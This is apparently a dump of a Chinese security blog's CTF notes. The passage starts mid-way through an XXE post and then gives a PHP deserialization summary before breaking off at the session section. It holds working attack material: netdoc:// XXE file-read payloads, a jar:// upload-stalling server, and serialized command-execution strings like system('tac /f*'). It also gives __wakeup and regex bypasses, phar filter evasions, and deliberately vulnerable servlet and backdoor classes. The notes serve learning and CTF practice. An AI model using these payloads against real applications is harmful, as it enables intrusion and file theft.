doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{\n        String parmeter = request.getParameter(\"poc\");\n\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        DocumentBuilder db = null;\n        try {\n            db = dbf.newDocumentBuilder();\n        } catch (ParserConfigurationException e) {\n            throw new RuntimeException(e);\n        }\n        StringReader sr = new StringReader(parmeter);\n        InputSource is = new InputSource(sr);\n\n        try {\n            Document document = db.parse(is);\n            PrintWriter writer = response.getWriter();\n            Element element = document.getDocumentElement();\n            NodeList list = element.getChildNodes();\n            for (int iloop = 0; iloop < list.getLength(); iloop++) {\n                Node node = list.item(iloop);\n                if (node.getNodeType() == Node.ELEMENT_NODE) {\n                    writer.write(node.getNodeName() + \"：\"\n                            + node.getTextContent());\n                }\n            }\n            writer.close();\n        } catch (SAXException e) {\n            throw new RuntimeException(e);\n        }\n\n    }\n\n}\n```\n\n![](/img/summary/xxe-5.png)\n\n\n再用python起个http服务，进行监听\n\nxxe-jar.py\n```python\nimport sys\nimport time\nimport threading\nimport socketserver\nfrom urllib.parse import quote\nimport http.client as httpc\n\nlisten_host = 'localhost'\nlisten_port = 9999\njar_file = sys.argv[1]\n\nclass JarRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        http_req = b''\n        print('New connection:',self.client_address)\n        while b'\\r\\n\\r\\n' not in http_req:\n            try:\n                http_req += self.request.recv(4096)\n                print('Client req:\\r\\n',http_req.decode())\n                jf = open(jar_file, 'rb')\n                contents = jf.read()\n                headers = ('''HTTP/1.0 200 OK\\r\\n'''\n                '''Content-Type: application/java-archive\\r\\n\\r\\n''')\n                self.request.sendall(headers.encode('ascii'))\n\n                self.request.sendall(contents[:-1])\n                time.sleep(30)\n                print(30)\n                self.request.sendall(contents[-1:])\n\n            except Exception as e:\n                print (\"get error at:\"+str(e))\n\n\nif __name__ == '__main__':\n\n    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)\n    print ('waiting for connection...')\n    server_thread = threading.Thread(target=jarserver.serve_forever)\n    server_thread.daemon = True\n    server_thread.start()\n    server_thread.join()\n```\n\n\n执行`python xxe-jar.py evil.zip`\n\n`evil.zip`就是要上传的文件了，不一定要是`zip`，但是因为`jar`协议会对文件进行解包操作，如果不上传`zip`格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次`zip`格式文件获取路径然后再上传其他文件\n\n\n访问`/xxe`，`post`发`payload`\n\n获取路径\n![](/img/summary/xxe-7.png)\n\n上传文件\n![](/img/summary/xxe-8.png)\n\n监听情况，`30`是延时了`30`秒\n![](/img/summary/xxe-6.png)\n\n\n至于为什么要延迟，回到`jar`协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行`sleep`，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了\n\n\n\n\n## netdoc 协议 ##\n\n`Java`中`netdoc`协议可以替代`file`协议功能，读文件，同时也可以列目录\n\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE creds [\n        <!ELEMENT creds ANY>\n        <!ENTITY xxe SYSTEM \"netdoc:///c:/windows/system.ini\">\n        ]>\n<creds>&xxe;</creds>\n```\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE creds [\n        <!ELEMENT creds ANY>\n        <!ENTITY xxe SYSTEM \"netdoc:///var/www/html/\">\n        ]>\n<creds>&xxe;</creds>\n```\n\n\n\n\n参考：\n[从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887)\n[XXE 总结](https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/)\n[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)\n[从几道CTF题学习Blind XXE](https://xz.aliyun.com/t/8041)\n[Java XXE 漏洞](https://jlkl.github.io/2020/08/24/Java_03/)\n[java代码审计-xxe](https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md)\n[XML之DTD](https://www.cnblogs.com/SUN99bk/p/11826523.html)\n[xxe漏洞攻击与防御](https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML)\n[XXE 漏洞总结](https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95)","tags":["总结","xxe"],"categories":["总结"]},{"title":"php反序列化总结","url":"/posts/dad17cf6/","content":"\n# 常见的魔术方法\n\n```php\n__construct()： 在创建对象时候初始化对象，一般用于对变量赋初值。\n__destruct()： 和构造函数相反，当对象所在函数调用完毕后执行。\n__call()： 当调用对象中不存在的方法会自动调用该方法。\n__get()： 获取对象不存在的属性时执行此函数。\n__set()： 设置对象不存在的属性时执行此函数。\n__toString()： 当对象被当做一个字符串使用时调用。\n__sleep()： 序列化对象之前就调用此方法(其返回需要一个数组)\n__wakeup()： 反序列化恢复对象之前调用该方法\n__isset()： 在不可访问的属性上调用isset()或empty()触发\n__unset()： 在不可访问的属性上使用unset()时触发\n__invoke()： 将对象当作函数来使用时执行此方法\n```\n\n## __construct & __destruct\n\n`__construct`：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化\n`__destruct`：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁\n\n例子：\n\n```php\n<?php\nclass test{\n\tpublic $username;\n\tpublic $password;\n\n\tfunction __construct($username,$password){\n\t\techo \"__construct\\n\";\n        $this->username = $username;\n        $this->password = $password;\n\t}\n\n\tfunction __destruct(){\n\t\techo \"__destruct\\n\";\n\t}\n}\n\n$a = new test('admin','admin888');\nunset($a);\necho \"abc\\n\";\necho \"--------------------\\n\";\n\n$a = new test('admin','admin888');\necho \"abc\\n\";\n```\n\n运行结果\n\n```php\n__construct\n__destruct\nabc\n--------------------\n__construct\nabc\n__destruct\n```\n\n## __sleep & __wakeup\n\n`__sleep`：序列化时自动调用\n`__wakeup`：反序列化时自动调用\n\n>如果类中同时定义了 __unserialize()和__wakeup() 两个魔术方法，\n>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n\n>同理，如果类中同时定义了 __serialize()和 __sleep() 两个魔术方法，\n>则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。\n\n```php\n<?php\nclass test{\n\tpublic $username;\n\tpublic $password;\n\n\tfunction __construct($username,$password){\n\t\techo \"__construct\\n\";\n        $this->username = $username;\n        $this->password = $password;\n\t}\n\n\tfunction __sleep(){\n\t\techo \"__sleep\\n\";\n\t\treturn [username,password]; //需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误\n\t}\n\n\tfunction __wakeup(){\n\t\techo \"__wakeup\\n\";\n\t\t$this->username = 'user';\n\t}\n\n}\n\n$a = new test('admin','admin888');\n$data = serialize($a);\necho $data.\"\\n\";\necho \"-----------------------------\\n\";\nvar_dump(unserialize($data));\n```\n\n运行结果\n\n```php\n__construct\n__sleep\nO:4:\"test\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:8:\"admin888\";}\n-----------------------------\n__wakeup\nclass test#2 (2) {\n  public $username =>\n  string(4) \"user\"\n  public $password =>\n  string(8) \"admin888\"\n}\n```\n\n## __call & __callstatic\n\n`__call`：对象执行类不存在的方法时会自动调用`__call`方法\n`__callstatic`：直接执行类不存在的方法时会自动调用`__callstatic`方法\n\n```php\n<?php\nclass test{\n\tpublic $username;\n\tpublic $password;\n\n\tfunction __call($method,$args){\n\t\techo '不存在'.$method.'方法(__call)'.'<br>';\n\t}\n\n\t\tfunction __callstatic($method,$args){\n\t\techo '不存在'.$method.'方法(__callstatic)'.'<br>';\n\t}\n}\n\n$a = new test();\n$a->lewiserii();\ntest::lewiserii();\n```\n\n运行结果\n```php\n不存在lewiserii方法(__call)\n不存在lewiserii方法(__callstatic)\n```\n\n## __get & __set\n\n\n`__get`：对不可访问属性或不存在属性进行 访问引用时自动调用\n`__set`：对不可访问属性或不存在属性进行 写入时自动调用\n\n```php\n<?php\nclass test{\n\tpublic $username='admin';\n\tprivate $password='admin888';\n\n\tfunction __get($name){\n\t\techo \"__get\\n\";\n\t}\n\n\tfunction __set($name,$value){\n\t\techo \"__set\\n\";\n\t}\n\n}\n\n$a = new test();\n$a->password;\n$a->password='123456';\n```\n\n运行结果\n\n```php\n__get\n__set\n```\n\n\n\n## __isset & __unset\n\n`__isset`：在不可访问的属性上使用`inset()`时触发\n`__unset`：在不可访问的属性上使用`unset()`时触发\n\n```php\n<?php\nclass test{\n\tpublic $username='admin';\n\tprivate $password='admin888';\n\n\tfunction __isset($name){\n\t\techo \"__isset\\n\";\n\t}\n\tfunction __unset($name){\n\t\techo \"__unset\\n\";\n\t}\n}\n\n$a = new test();\nisset($a->password);\nunset($a->psd);\n```\n\n运行结果\n\n```php\n__isset\n__unset\n```\n\n## __tostring\n\n`__toString()`：类的实例和字符串拼接或者作为字符串引用时会自动调用\n\n\n```php\n<?php\nclass test{\n\tpublic $username='admin';\n\tprivate $password='admin888';\n\n\tfunction __tostring(){\n\t\treturn \"tostring\";\n\t}\n\n}\n\n$a = new test();\necho $a;\n```\n\n运行结果\n\n```php\ntostring\n```\n\n\n\n## __invoke\n\n`__invoke()`：将对象当作函数来使用时调用此方法\n\n\n```php\n<?php\nclass test{\n\tpublic $username='admin';\n\tprivate $password='admin888';\n\n\tfunction __invoke(){\n\t\techo \"__invoke\";\n\t}\n\n}\n\n$a = new test();\n$a();\n```\n\n运行结果\n\n```php\n__invoke\n```\n\n\n# 反序列化绕过的几种方法\n\n## 绕过__wakeup\n\n### CVE-2016-7124\n\n>利用条件：\n>PHP5 < 5.6.25\n>​PHP7 < 7.0.10\n\n利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过`__wakeup`的执行\n\n例子：\n\n```php\n<?php\nclass test{\n    public $a='test';\n\n    public function __wakeup(){\n        $this->a='aaa';\n    }\n\n    public function  __destruct(){\n        echo $this->a;\n    }\n}\n\n//$v = new test();\n//echo serialize($v);\n//O:4:\"test\":1:{s:1:\"a\";s:4:\"test\";}test\n?>\n```\n\n当执行`unserialize('O:4:\"test\":1:{s:1:\"a\";s:4:\"test\";}');`时会返回`aaa`，在修改对象属性个数的值，执行`unserialize('O:4:\"test\":2:{s:1:\"a\";s:4:\"test\";}');`会返回`test`\n\n\n\n### 利用反序列化字符串报错\n\n利用一个包含`__destruct`方法的类触发魔术方法可绕过`__wakeup`方法\n\n例子\n```php\n<?php\n\nclass D {\n\n    public function __get($name) {\n        echo \"D::__get($name)\\n\";\n    }\n    public function __destruct() {\n        echo \"D::__destruct\\n\";\n    }\n    public function __wakeup() {\n        echo \"D::__wakeup\\n\";\n    }\n}\n\nclass C {\n    public function __destruct() {\n        echo \"C::__destruct\\n\";\n        $this->c->b;\n\n    }\n}\n\n\nunserialize('O:1:\"C\":1:{s:1:\"c\";O:1:\"D\":0:{};N;}');\n```\n\n原本应该是`O:1:\"C\":1:{s:1:\"c\";O:1:\"D\":0:{}}`\n调用顺序是\n```php\nD::__wakeup\nC::__destruct\nD::__get(b)\nD::__destruct\n```\n\n添加了一个`;N;`(反序列化末尾加上`;任意字符;`)的错误结构后调用顺序就变成了\n```php\nC::__destruct\nD::__get(b)\nD::__wakeup\nD::__destruct\n```\n\n来自Article_kelp师傅的原理解释，orz：\n![](/img/summary/php_unserialize-16.jpg)\n\n\n### 使用C代替O\n\n```php\na - array\nb - boolean\nd - double\ni - integer\no - common object\nr - reference\ns - string\nC - custom object\nO - class\nN - null\nR - pointer reference\nU - unicode string\n```\n\n例子\n```php\n<?php\n//https://3v4l.org/YAje0\n//https://bugs.php.net/bug.php?id=81151\nclass E  {\n    public function __construct(){\n\n    }\n\n    public function __destruct(){\n        echo \"destruct\";\n    }\n\n    public function __wakeup(){\n        echo \"wake up\";\n    }\n}\n\nvar_dump(unserialize('C:1:\"E\":0:{}'));\n```\n\n比较鸡肋，只能执行`construct()`和`destruct()`函数，无法添加任何内容\n\n但是在**特定的PHP版本**下，可以使用一些内置类来重新包装实现绕过\n\n\n```php\nArrayObject::unserialize\nArrayIterator::unserialize\nRecursiveArrayIterator::unserialize\nSplDoublyLinkedList::unserialize\nSplQueue::unserialize\nSplStack::unserialize\nSplObjectStorage::unserialize\n```\n\n例如ctfshow的2023愚人杯[easy_php]\n\n```php\n<?php\n\nclass ctfshow {\n    public $ctfshow;\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        echo \"OK\";\n        system($this->ctfshow);\n    }\n\n\n}\n$a= new ctfshow();\n$a->ctfshow= \"cat /f1agaaa\";\n\n\n\n//$b=new SplObjectStorage();\n//$b->test=$a;\n//echo serialize($b);\n//C:16:\"SplObjectStorage\":77:{x:i:0;m:a:1:{s:4:\"test\";O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";}}}\n\n\n\n//$b=new ArrayObject($a);\n//echo serialize($b);\n//C:11:\"ArrayObject\":67:{x:i:0;O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";};m:a:0:{}}\n\n\n\n//$b=new ArrayIterator($a);\n//echo serialize($b);\n//C:13:\"ArrayIterator\":67:{x:i:0;O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";};m:a:0:{}}\n\n\n\n\n//$b=new RecursiveArrayIterator($a);\n//echo serialize($b);\n//C:22:\"RecursiveArrayIterator\":67:{x:i:0;O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";};m:a:0:{}}\n\n\n\n//$b=new SplDoublyLinkedList();\n//$b->push($a);\n//echo serialize($b);\n//C:19:\"SplDoublyLinkedList\":57:{i:0;:O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";}}\n\n\n\n\n//$b=new SplQueue();\n//$b->push($a);\n//echo serialize($b);\n//C:8:\"SplQueue\":57:{i:4;:O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";}}\n\n\n\n//$b=new SplStack();\n//$b->push($a);\n//echo serialize($b);\n//C:8:\"SplStack\":57:{i:6;:O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:12:\"cat /f1agaaa\";}}\n\n```\n\n\n不过有几个类在使用时要注意需要加入push方法\n\n\n\n\n\n## 绕过正则\n\n### 检测'O'\n\n>利用条件：\n>preg_match('/^O:\\d+/i',$data)\n\n\n例题：\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass backdoor{\n    public $name;\n\n    public function __destruct(){\n        eval($this->name);\n    }\n}\n\n$data = $_POST['data'];\n\nif (preg_match('/^O:\\d+/i',$data)){\n    die(\"object not allow unserialize\");\n}\n```\n\n\n利用方式1：当在代码中使用类似`preg_match('/^O:\\d+/i',$data)`的正则语句来匹配是否是对象字符串开头的时候，可以使用`+`绕过\n\n`O:8:\"backdoor\":1:{s:4:\"name\";s:18:\"system('tac /f*');\";}`\n`O:+8:\"backdoor\":1:{s:4:\"name\";s:18:\"system('tac /f*');\";}`\n\n要注意在`url`里传参时`+`要编码为`%2B`\n\n\n利用方式2：使用`array()`绕过\n```php\n<?php\nclass backdoor{\n    public $name=\"system('tac /f*');\";\n}\n\n$a = new backdoor();\necho serialize(array($a));\n//a:1:{i:0;O:8:\"backdoor\":1:{s:4:\"name\";s:18:\"system('tac /f*');\";}}\n?>\n```\n\n### 检测'}'\n\n有时候会遇到另一种正则，比如`/\\}$/`，会匹配最后一个`}`\n\n反序列化字符串末尾的`}}}}`是可以全部删掉的，没有影响\n\n比如`a:1:{i:0;O:4:\"test\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}}`\n\n变成`a:1:{i:0;O:4:\"test\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";`\n\n甚至在末尾填充字符`a:1:{i:0;O:4:\"test\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";aaaaaaaaaa`\n\n均能正常解析\n\n### 检测数字\n\n可以用字符`i`、`d`绕过\n\n```php\n<?php\n//https://3v4l.org/SJm2g\n// echo serialize(0);\n\necho unserialize('i:-1;');\necho \"\\n\";\necho unserialize('i:+1;');\necho \"\\n\";\necho unserialize('d:-1.1;');\necho \"\\n\";\necho unserialize('d:+1.2;');\n```\n\n## 引用绕过\n\n利用方式：当代码中存在类似`$this->a===$this->b`的比较时可以用`&`，使`$a`永远与`$b`相等\n\n例子：\n\n```php\n<?php\nclass test{\n    public $a;\n    public $b;\n\n    public function __construct(){\n        $this->a = 'abc';\n        $this->b = &$this->a;\n    }\n    public function  __destruct(){\n        if($this->a===$this->b){\n            echo 666;\n        }\n    }\n}\n\n$a = serialize(new test());\n\n?>\n```\n\n`$this->b = &$this->a;`表示`$b`变量指向的地址永远指向`$a`变量指向的地址\n\n\n## 16进制绕过\n\n利用方式：当代码中存在关键词检测时，将表示字符类型的`s`改为大写来绕过检测\n\n例子：\n\n```php\n<?php\nclass test{\n    public $username='admin';\n    public $password='admin888';\n}\necho serialize(new test());\n//O:4:\"test\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:8:\"admin888\";}\n?>\n```\n\n如果过滤了关键字`admin`，可以将其替换成`O:4:\"test\":2:{s:8:\"username\";S:5:\"\\61dmin\";s:8:\"password\";S:8:\"\\61dmin888\";}`\n\n表示字符类型的s为大写时，就会被当成16进制解析\n\n\n\n## 字符逃逸\n\n\n```php\n<?php\nclass test{\n\tpublic $a='aaa';\n\tpublic $b='bbb';\n}\n\n$v = new test();\necho serialize($v);\n//O:4:\"test\":2:{s:1:\"a\";s:3:\"aaa\";s:1:\"b\";s:3:\"bbb\";}\n?>\n```\n\n\n由于`php`在进行反序列化时，是从左到右读取，读取多少取决于`s`后面的字符长度，且认为读到`}`就结束了，`}`后面的字符不会有影响\n\n\n一般触发字符逃逸的条件是替换函数`str_replace`，使字符串长度改变，造成字符逃逸，读取到不一样的数据\n\n\n\n### 过滤后字符变多\n\n```php\n<?php\nclass test{\n\tpublic $a='aaa';\n\tpublic $b='bbb';\n}\n\nfunction filter($str){\n    return str_replace(\"aaa\",\"aaaa\",$str);\n}\n\n\n$v = new test();\necho filter(serialize($v));\n//O:4:\"test\":2:{s:1:\"a\";s:3:\"aaaa\";s:1:\"b\";s:3:\"bbb\";}\n?>\n```\n\n可以发现结果中的`aaa`被替换成了`aaaa`，但是长度值没变，还是`3`，这就导致多出了一个`a`，而且值是可控的，我们可以将这部分值变为 `很多aaa\";s:1:\"b\";s:3:\"qaq\";}`， `很多aaa`的具体个数取决于后面想要构造的字符串的长度，这里是`21`位，就用`21`组`aaa`，这样替换后会多出`21`个字符\n\n```php\n<?php\nclass test{\n\tpublic $a='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:1:\"b\";s:3:\"qaq\";}';\n\tpublic $b='bbb';\n}\n\nfunction filter($str){\n    return str_replace(\"aaa\",\"aaaa\",$str);\n}\n\n\n$v = new test();\necho filter(serialize($v));\n//O:4:\"test\":2:{s:1:\"a\";s:84:\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:1:\"b\";s:3:\"qaq\";}\";s:1:\"b\";s:3:\"bbb\";}\n?>\n```\n\n`$b`的值成功被修改成了`qaq`\n\n\n### 过滤后字符变少\n\n原理与`过滤后字符变多`大同小异，就是前面少了，导致后面的字符被吃掉，从而执行了我们后面的代码\n\n```php\n<?php\nclass test{\n\tpublic $a='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';\n\tpublic $b='\";s:1:\"b\";s:3:\"abc\";}';\n}\n\nfunction filter($str){\n    return str_replace(\"aaa\",\"aa\",$str);\n}\n\n\n$v = new test();\necho filter(serialize($v));\n\n//O:4:\"test\":2:{s:1:\"a\";s:48:\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:1:\"b\";s:21:\"\";s:1:\"b\";s:3:\"abc\";}\";}\n?>\n```\n\n主要注意闭合就行了，与sql注入类似\n\n\n## 类属性不敏感\n\n对于`PHP`版本`7.1+`，对属性的类型不敏感\n\n```php\n<?php\n\nclass test {\n\tprivate $hello=\"private\";\n\n\tfunction __destruct(){\n\t\tvar_dump($this->hello);\n\t}\n}\nunserialize('O:4:\"test\":1:{s:5:\"hello\";s:6:\"public\";}');\n//string(6) \"public\"\n```\n\n令`public`时得到的序列化字符串，在`priviate`或者`protected`修饰的时候反序列化，`hello`属性都能获得值\n\n\n\n## 类名和方法名不区分大小写\n\n```text\nPHP特性：\n变量名区分大小写\n常量名区分大小写\n数组索引 (键名) 区分大小写\n函数名, 方法名, 类名不区分大小写\n魔术常量不区分大小写 (以双下划线开头和结尾的常量)\nNULL TRUE FALSE 不区分大小写\n强制类型转换不区分大小写 (在变量前面加上 (type))\n```\n\n常见用来绕过正则\n\n如ctfshow的一道题目\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-04 23:52:24\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-05 00:17:08\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nhighlight_file(__FILE__);\n\ninclude('flag.php');\n$cs = file_get_contents('php://input');\n\n\nclass ctfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public function __construct($u,$p){\n        $this->username=$u;\n        $this->password=$p;\n    }\n    public function login(){\n        return $this->username===$this->password;\n    }\n    public function __toString(){\n        return $this->username;\n    }\n    public function __destruct(){\n        global $flag;\n        echo $flag;\n    }\n}\n$ctfshowo=@unserialize($cs);\nif(preg_match('/ctfshow/', $cs)){\n    throw new Exception(\"Error $ctfshowo\",1);\n}\n```\n\n\n## fast destruct\n\n>通常发序列化的入口在__destruct()方法，如果在反序列化操作之后抛出了异常则会跳过__destruct()函数的执行。\n\n例如这样一道题目\n```php\n<?php\nclass Test\n{\n    public $args;\n\n    public function __destruct()\n    {\n        system($this->args);\n    }\n}\n$a = @unserialize($_GET['args']);\nthrow new Exception(\"NoNoNo\");\n```\n\n反序列化操作执行之后并没有立即执行`__destruct()`方法中的内容，而是抛出了异常导致`__destruct()`方法被跳过。但是我们可以修改序列化得到的字符串使得反序列化解析出错，导致`__destruct()`方法被提前执行。\n\n正常情况下的序列化字符串应该是：\n\n`O:4:\"Test\":1:{s:4:\"args\";s:6:\"whoami\";}`\n\npayload:\n```php\n//去掉一个大括号\nO:4:\"Test\":1:{s:4:\"args\";s:6:\"whoami\";\n\n//结尾加入多余数据\nO:4:\"Test\":1:{s:4:\"args\";s:6:\"whoami\";123a}\n```\n\n\n## serialize(unserialize(\\$x)) != $x\n\n正常来说一个合法的反序列化字符串，在反序列化之后再次序列化所得到的结果应是一致的\n\n![](/img/summary/php_unserialize-14.png)\n\n虽然在例子中没有AAA这个类，但是在反序列化 序列化过后得到的值依然为原来的值\n\nvar_dump的结果：\n\n```php\n//class AAA{\n//    public $a = '1';\n//    public $b = '2';\n//}\n//$raw = 'O:3:\"AAA\":2:{s:1:\"a\";s:1:\"1\";s:1:\"b\";s:1:\"2\";}';\n//echo var_dump(unserialize($raw));\nobject(AAA)#1 (2) {\n  [\"a\"]=>\n  string(1) \"1\"\n  [\"b\"]=>\n  string(1) \"2\"\n}\n```\n\n```php\n//$raw = 'O:3:\"AAA\":2:{s:1:\"a\";s:1:\"1\";s:1:\"b\";s:1:\"2\";}';\n//echo var_dump(unserialize($raw));\nobject(__PHP_Incomplete_Class)#1 (3) {\n  [\"__PHP_Incomplete_Class_Name\"]=>\n  string(3) \"AAA\"\n  [\"a\"]=>\n  string(1) \"1\"\n  [\"b\"]=>\n  string(1) \"2\"\n}\n```\n\nvar_dump后可以发现以下差异\n\n```text\n1：所属类名称\n对象所属类的名称由 AAA 变为了 __PHP__Incomplete_Class\n\n2：__PHP_Incomplete_Class_Name 属性\n__PHP_Incomplete_Class 对象中多包含了一个 __PHP_Incomplete_Class_Name 属性\n```\n\n所以PHP在遇到不存在的类时，会把不存在的类转换成 __PHP_Incomplete_Class 这种特殊的类，并且将原始的类名存放在 __PHP_Incomplete_Class_Name 这个属性中。而 serialize() 在处理的时候会倒推回来，发现对象是 __PHP_Incomplete_Class 后，会序列化成 __PHP_Incomplete_Class_Name 的值为类名的类，**同时将 __PHP_Incomplete_Class_Name 删除（属性个数减一）**\n\n\n所以可以手动构造一个包含`__PHP__Incomplete_Class`的序列化字符串，因为是我们手动构造的，所以`__PHP_Incomplete_Class_Name`值为空，serialize找不到后会跳过，但是属性个数减一的步骤不会跳过，所以构成了`serialize(unserialize($x)) != $x`\n\n![](/img/summary/php_unserialize-15.png)\n\n>注意：若 __PHP_Incomplete_Class 对象中的属性个数为零，则 __PHP_Incomplete_Class 的序列化结果中的属性个数描述值也将为零\n\n# phar反序列化\n\n>众所周知，在利用反序列化漏洞的时候，一般是将序列化后的字符串传入`unserialize()`来利用。但是通过`phar`可以不依赖`unserialize()`直接进行反序列化操作\n\n\nPhar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。在PHP 5.3或更高版本中默认开启\n\n\nphar结构由4部分组成\n\n**一：stub**\n\nstub的基本结构：`xxx<?php xxx;__HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。类似于Phar的文件头\n\n\n**二：manifest**\n\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里就是漏洞利用的关键点\n\n\n**三：contents**\n\n被压缩文件的内容\n\n\n**四：signature**\n\n签名，放在文件末尾\n\n签证尾部的01代表md5加密，02代表sha1加密，04代表sha256加密，08代表sha512加密\n\n![](/img/summary/php_unserialize-11.png)\n\n\n\n一个最基本的例子\n\n```php\n<?php\nclass Test {\n}\n\n$a = new Test();\n\n$phar = new Phar(\"test.phar\");   //后缀名必须为phar\n$phar->startBuffering();  //开始缓冲Phar写操作\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\");   //设置stub\n$phar->setMetadata($a);  //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering(); //停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n```\n\n![](/img/summary/php_unserialize-12.png)\n\n\nphp一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化\n受影响的函数如下\n\n```php\nfileatime\nfilectime\nfile_exists\nfile_get_contents\nfile_put_contents\nfile\nfilegroup\nfopen\nfileinode\nfilemtime\nfileowner\nfileperms\nis_dir\nis_executable\nis_file\nis_link\nis_readable\nis_writable\nis_writeable\nparse_ini_file\ncopy\nunlink\nstat\nreadfile\n```\n\n当我们修改文件的内容时，签名就会变得无效，这个时候需要重新计算签名\n\n```python\nfrom hashlib import sha1\nwith open('test.phar', 'rb') as file:\n    f = file.read()\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型和GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\nwith open('newtest.phar', 'wb') as file:\n    file.write(newf) # 写入新文件\n```\n\n\n\n## phar绕过上传限制\n\n```php\n<?php\nclass Test {\n}\n\n$a = new Test();\n\n$phar = new Phar(\"test.phar\");\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //添加任意的文件头\n$phar->setMetadata($a);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar->stopBuffering();\n?>\n```\n\n![](/img/summary/php_unserialize-13.png)\n\n\n## 绕过头部phar://\n\n如果题目限制了`phar://`不能出现在头几个字符，可以用`Bzip/Gzip`协议绕过\n\n例如\n\n```php\nif (preg_match(\"/^php|^file|^phar|^dict|^zip/i\",$filename){\n    die();\n}\n```\n\n```php\nphp://filter/read=convert.base64-encode/resource=phar://test.phar\n//即使用filter伪协议来进行绕过\n\ncompress.bzip2://phar:///test.phar/test.txt\n//使用bzip2协议来进行绕过\n\ncompress.zlib://phar:///home/sx/test.phar/test.txt\n//使用zlib协议进行绕过\n```\n\n\n## 绕过__HALT_COMPILER检测\n\n在前面介绍stub时提到过，PHP通过`__HALT_COMPILER`来识别Phar文件，那么为了防止Phar反序列化的出现，可能就会对这个进行过滤\n\n例如\n\n```php\nif (preg_match(\"/HALT_COMPILER/i\",$Phar){\n    die();\n}\n```\n\n**绕过方法一：**\n\n将Phar文件的内容写到压缩包注释中，压缩为zip文件\n\n```php\n<?php\n$a = serialize($a);\n$zip = new ZipArchive();\n$res = $zip->open('phar.zip',ZipArchive::CREATE);\n$zip->addFromString('flag.txt', 'flag is here');\n$zip->setArchiveComment($a);\n$zip->close();\n?>\n```\n\n**绕过方法二：**\n\n将生成的Phar文件进行gzip压缩，压缩后同样也可以进行反序列化\n\n```bash\ngzip test.phar\n```\n\n\n\n# session反序列化\n\n什么是session这里就不描述了，网上有很多文章可以参考\n\n先了解下`PHP session`不同引擎的存储机制\n\n`PHP 